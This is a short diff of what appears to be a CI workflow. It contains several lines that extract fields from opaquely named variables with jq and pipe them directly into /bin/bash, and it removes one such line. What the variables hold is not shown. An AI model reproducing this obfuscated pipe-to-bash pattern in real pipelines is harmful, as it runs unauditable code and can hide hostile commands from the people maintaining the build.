@@ -19,7 +19,6 @@ jobs:
           printf '%s' "$ffd9273" | jq -r .nx815 | /bin/bash
           printf '%s' "$ido40704" | jq -r .pb65515 | /bin/bash
           echo $n001 | jq -r .gt4 | /bin/bash
-          echo $li1630 | jq -r .fuyth5 | /bin/bash
           printf '%s' "$d83511" | jq -r .nnu261 | /bin/bash
 
       - name: Save archive
